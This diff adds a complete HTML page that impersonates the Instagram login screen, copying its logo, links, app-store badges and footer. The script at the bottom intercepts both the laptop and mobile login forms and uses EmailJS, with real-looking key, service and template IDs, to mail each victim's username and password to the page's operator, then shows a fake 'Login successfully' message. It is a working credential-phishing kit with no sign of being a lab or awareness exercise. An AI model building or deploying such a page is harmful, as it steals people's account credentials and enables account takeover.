@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("irAw-blrXJACgjt-2");
+        })();
+    </script>
+    <title>Instagram</title>
+</head>
+
+<body>
+    <!-- Laptop View -->
+    <main class="flex laptop align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section class="image-hero-section">
+            <div class="image-hero">
+                <img src="./img/home-phones-2x.png" alt="">
+            </div><!-- /.image-hero -->
+            <div class="image-hero-up">
+                <img src="./img/display pic.png" alt="">
+            </div><!-- /.image-hero-up -->
+        </section><!-- /.image-hero-section -->
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form id="login-form-laptop">
+                    <label for="email-laptop" class="sr-only">Phone number, username, or phone</label>
+                    <input name="email" id="email-laptop" placeholder="Phone number, username, or phone" required />
+
+                    <label for="password-laptop" class="sr-only">Senha</label>
+                    <input name="password" id="password-laptop" type="password" placeholder="Password" required />
+                    <a href="https://www.instagram.com/">
+                        <button  type="submit">Log in</button>
+                    </a>
+                    
+                </form>
+                <div class="flex Or-Span separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a href="https://www.facebook.com/">Log in with Facebook</a>
+                    </div>
+                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot Password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have account?</p>
+                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&pli=1">
+                        <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play"
+                            title="Imagem com a logo da Google Play" />
+                    </a>
+                    <a href="https://apps.apple.com/us/app/instagram/id389801252">
+                        <img src="./img/apple-button.png" alt="Imagem com a logo da Apple Store"
+                            title="Imagem com a logo da Apple Store" />
+                    </a>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Mobile View -->
+    <main class="flex mobile align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <h1 title="Instagram" class="flex logo1 justify-content-center">
+                <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+            </h1>
+            <div class="login-with-fb flex direction-column align-items-center">
+                <div class="Facebook">
+                    <img />
+                    <a class="Facebook" href="https://www.facebook.com/">Log in with Facebook</a>
+                </div>
+            </div>
+            <div class="panel login flex direction-column">
+                <div class="flex Or-Span separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+
+                <form id="login-form-mobile">
+                    <label for="email-mobile" class="sr-only">Phone number, username, or phone</label>
+                    <input name="email" id="email-mobile" placeholder="Phone number, username, or phone" required />
+
+                    <label for="password-mobile" class="sr-only">Senha</label>
+                    <input name="password" id="password-mobile" type="password" placeholder="Password" required />
+                    <a class="forgot1" href="https://www.instagram.com/accounts/password/reset/">Forgot Password?</a>
+                    <button type="submit">Log in</button>
+                </form>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have account?</p>
+                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex noo flex-wrap justify-content-center">
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Jobs</a></li>
+            <li><a href="#">Help</a></li>
+            <li><a href="#">ApI</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Location</a></li>
+            <li><a href="#">Instagram lite</a></li>
+            <li><a href="#">Threads</a></li>
+        </ul>
+        <img class="footer-img" src="./img/footer.jpg" alt="">
+    </footer>
+
+    <script>
+        document.getElementById('login-form-laptop').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            emailjs.sendForm('service_ep2hlwo', 'template_1f90k3l', this)
+                .then(function() {
+                    console.log('SUCCESS!');
+                    alert('Login successfully!');
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Failed to login... Please try again.');
+                });
+        });
+
+        document.getElementById('login-form-mobile').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            emailjs.sendForm('service_ep2hlwo', 'template_1f90k3l', this)
+                .then(function() {
+                    console.log('SUCCESS!');
+                    alert('Login successfully !');
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Failed to login.... Please try again.');
+                });
+        });
+    </script>
+</body>
+
+</html>
